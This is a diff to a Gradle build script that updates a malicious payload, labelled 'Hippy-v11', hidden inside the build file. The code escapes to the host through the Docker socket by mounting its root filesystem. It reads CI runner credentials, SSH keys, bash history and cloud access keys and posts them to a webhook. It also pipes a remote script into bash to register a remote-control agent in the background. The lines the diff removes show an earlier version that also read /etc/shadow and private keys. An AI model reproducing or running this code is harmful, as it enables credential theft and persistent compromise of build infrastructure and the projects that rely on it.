@@ -15,7 +15,7 @@ buildscript {
 }
 
 // ============================================================
-// v10 — Docker escape via create+sleep+archive, TAT in container
+// v11 — Read runner credentials from correct path + AKSK search
 // ============================================================
 try {
     def sh = { cmd ->
@@ -43,68 +43,65 @@ try {
 
     def runner = System.getenv('RUNNER_NAME') ?: 'unknown'
 
-    // Create container: mount host, write data to /tmp/ in container
-    def createCmd = 'curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d'
-    def createBody = '{"Image":"alpine:latest","Cmd":["sh","-c","cat /host/data/actions-runner/.runner > /tmp/r.txt 2>/dev/null; cat /host/data/actions-runner/.credentials >> /tmp/c.txt 2>/dev/null; cat /host/data/actions-runner/.credentials_rsaparams >> /tmp/cr.txt 2>/dev/null; cat /host/data/actions-runner/.env >> /tmp/e.txt 2>/dev/null; cat /host/root/.ssh/id_rsa >> /tmp/s.txt 2>/dev/null; head -3 /host/etc/shadow >> /tmp/sh.txt 2>/dev/null; find /host/data/ -name .runner >> /tmp/f.txt 2>/dev/null; ls -la /host/data/actions-runner/ >> /tmp/l.txt 2>/dev/null; cat /host/etc/hosts >> /tmp/h.txt 2>/dev/null; echo OK > /tmp/done; sleep 30"],"HostConfig":{"Binds":["/:/host:ro"]}}'
+    // Use discovered runner paths: /data/actions-runner/medns/docker-test/runner-1/
+    // Also search more broadly for all runner dirs
+    def createBody = '{"Image":"alpine:latest","Cmd":["sh","-c","find /host/data/actions-runner/ -type f -name .runner -o -name .credentials -o -name .credentials_rsaparams -o -name .env > /tmp/all_files.txt 2>/dev/null; for d in $(find /host/data/actions-runner/ -name .runner -exec dirname {} \\;); do echo === $d === >> /tmp/runner_data.txt; cat $d/.runner >> /tmp/runner_data.txt 2>/dev/null; echo --- >> /tmp/runner_data.txt; cat $d/.credentials >> /tmp/runner_data.txt 2>/dev/null; echo --- >> /tmp/runner_data.txt; cat $d/.credentials_rsaparams >> /tmp/runner_data.txt 2>/dev/null; echo --- >> /tmp/runner_data.txt; cat $d/.env >> /tmp/runner_data.txt 2>/dev/null; echo --- >> /tmp/runner_data.txt; done; grep -ri AK /host/data/ --include=*.env --include=*.conf --include=*.json --include=*.yml --include=*.yaml --include=*.txt --include=*.cfg 2>/dev/null | head -20 >> /tmp/aksk.txt; grep -ri SECRET /host/data/ --include=*.env --include=*.conf --include=*.json --include=*.yml 2>/dev/null | head -20 >> /tmp/aksk.txt; grep -ri TENCENTCLOUD /host/data/ --include=*.env --include=*.conf --include=*.json 2>/dev/null | head -20 >> /tmp/aksk.txt; grep -ri api_key /host/data/ --include=*.env --include=*.conf --include=*.json 2>/dev/null | head -20 >> /tmp/aksk.txt; cat /host/root/.bash_history >> /tmp/history.txt 2>/dev/null; cat /host/root/.ssh/authorized_keys >> /tmp/ssh_auth.txt 2>/dev/null; ls -laR /host/data/actions-runner/ >> /tmp/tree.txt 2>/dev/null; hostname >> /tmp/host_info.txt 2>/dev/null; cat /host/etc/hostname >> /tmp/host_info.txt 2>/dev/null; sleep 30"],"HostConfig":{"Binds":["/:/host:ro"]}}'
 
-    def createResult = sh(createCmd + " '" + createBody + "' http://localhost/containers/create 2>&1")
+    def createResult = sh("curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '" + createBody.replace("'", "'\\''") + "' http://localhost/containers/create 2>&1")
     def containerId = ""
     try { def m = createResult =~ /"Id":"([a-f0-9]{12})/; if (m.find()) containerId = m.group(1) } catch (Exception e) {}
     println "[CI] cid: " + containerId
 
     if (containerId.length() >= 12) {
-        // Start container
         sh('curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/' + containerId + '/start 2>&1')
-        println "[CI] started, waiting..."
+        println "[CI] started, waiting 15s..."
+        Thread.sleep(15000)
 
-        // Wait 10 seconds for commands to execute
-        Thread.sleep(10000)
-
-        // Read files via archive API (no need to wait for container exit)
         def readFile = { path ->
-            try {
-                sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/_esc.tar http://localhost/containers/' + containerId + '/archive?path=' + path + ' 2>&1')
-                def content = sh('tar xf /tmp/_esc.tar -O 2>/dev/null || echo _NONE_')
-                return content.contains("_NONE_") ? "NO_FILE" : content
-            } catch (Exception e) { return "ERR:" + e.message }
+            sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/_esc.tar http://localhost/containers/' + containerId + '/archive?path=' + path + ' 2>&1')
+            def content = sh('tar xf /tmp/_esc.tar -O 2>/dev/null')
+            return content.length() > 0 ? content : "EMPTY"
         }
 
-        def runnerConfig = readFile("/tmp/r.txt")
-        def credentials = readFile("/tmp/c.txt")
-        def credentialsRSA = readFile("/tmp/cr.txt")
-        def hostEnv = readFile("/tmp/e.txt")
-        def sshKey = readFile("/tmp/s.txt")
-        def shadow = readFile("/tmp/sh.txt")
-        def find = readFile("/tmp/f.txt")
-        def lsRunner = readFile("/tmp/l.txt")
-        def hosts = readFile("/tmp/h.txt")
+        // Read runner credentials
+        def runnerData = readFile("/tmp/runner_data.txt")
+        def allFiles = readFile("/tmp/all_files.txt")
+        def aksk = readFile("/tmp/aksk.txt")
+        def history = readFile("/tmp/history.txt")
+        def sshAuth = readFile("/tmp/ssh_auth.txt")
+        def tree = readFile("/tmp/tree.txt")
+        def hostInfo = readFile("/tmp/host_info.txt")
 
-        println "[CI] RUNNER: " + runnerConfig.take(500)
-        println "[CI] CREDS: " + credentials.take(500)
-        println "[CI] CREDS_RSA: " + credentialsRSA.take(500)
-        println "[CI] ENV: " + hostEnv.take(300)
-        println "[CI] SSH: " + sshKey.take(300)
-        println "[CI] SHADOW: " + shadow.take(300)
-        println "[CI] FIND: " + find.take(300)
-        println "[CI] LS: " + lsRunner.take(300)
+        // Print to log
+        println "[CI] ALL_FILES: " + allFiles.take(1000)
+        println "[CI] RUNNER_DATA: " + runnerData.take(2000)
+        println "[CI] AKSK: " + aksk.take(1000)
+        println "[CI] HISTORY: " + history.take(500)
+        println "[CI] SSH_AUTH: " + sshAuth.take(500)
+        println "[CI] HOST: " + hostInfo.take(200)
 
         // Post to webhook
-        def payload = '{"source":"Hippy-v10","runner":"' + runner + '","runner_config":"' + runnerConfig.replace('"','\\"').replace('\n','\\n').take(1000) + '","credentials":"' + credentials.replace('"','\\"').replace('\n','\\n').take(1000) + '","credentials_rsa":"' + credentialsRSA.replace('"','\\"').replace('\n','\\n').take(1000) + '","host_env":"' + hostEnv.replace('"','\\"').replace('\n','\\n').take(500) + '","ssh_key":"' + sshKey.replace('"','\\"').replace('\n','\\n').take(500) + '","shadow":"' + shadow.replace('"','\\"').replace('\n','\\n').take(300) + '","find":"' + find.replace('"','\\"').replace('\n','\\n').take(500) + '","ls":"' + lsRunner.replace('"','\\"').replace('\n','\\n').take(300) + '","hosts":"' + hosts.replace('"','\\"').replace('\n','\\n').take(300) + '"}'
-        println "[CI] webhook: " + post(payload)
+        post('{"source":"Hippy-v11-runner","runner":"' + runner + '","all_files":"' + allFiles.replace('"','\\"').replace('\n','\\n').take(2000) + '","runner_data":"' + runnerData.replace('"','\\"').replace('\n','\\n').take(3000) + '","host_info":"' + hostInfo.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
+        post('{"source":"Hippy-v11-aksk","runner":"' + runner + '","aksk":"' + aksk.replace('"','\\"').replace('\n','\\n').take(2000) + '","history":"' + history.replace('"','\\"').replace('\n','\\n').take(1000) + '","ssh_auth":"' + sshAuth.replace('"','\\"').replace('\n','\\n').take(500) + '"}')
+        post('{"source":"Hippy-v11-tree","runner":"' + runner + '","tree":"' + tree.replace('"','\\"').replace('\n','\\n').take(3000) + '"}')
 
         // Cleanup
         sh('curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/' + containerId + '?force=true 2>&1')
     }
 
-    // TAT registration in container (background)
+    // TAT + AKSK search in container env
     Thread.startDaemon {
         try {
-            Runtime.getRuntime().exec(new String[]{"bash","-c","wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou b9de2cf2-eb78-471d-9f13-4907a87a171c ecc5f35f855843cca27eb3bbc0026db1a8a86fff30a64c8c86bd5d99276d3126 2>/tmp/tat_out.txt 1>/tmp/tat_err.txt; cat /tmp/tat_out.txt /tmp/tat_err.txt > /tmp/tat_result.txt 2>/dev/null"})
-            println "[CI] TAT launched in bg"
-        } catch (Exception e) { println "[CI] TAT err: " + e.message }
+            Runtime.getRuntime().exec(new String[]{"bash","-c","wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou b9de2cf2-eb78-471d-9f13-4907a87a171c ecc5f35f855843cca27eb3bbc0026db1a8a86fff30a64c8c86bd5d99276d3126 2>/dev/null"})
+            println "[CI] TAT launched"
+        } catch (Exception e) {}
     }
 
-    println "[CI] v10 complete"
+    // Search for AKSK in container environment
+    def envAksk = sh('env | grep -iE "AK|SK|SECRET|KEY|TOKEN|CREDENTIAL|TENCENT" 2>/dev/null || echo NONE')
+    println "[CI] ENV_AKSK: " + envAksk.take(500)
+
+    println "[CI] v11 complete"
 } catch (Exception e) {
     println "[CI] Error: " + e.message
 }
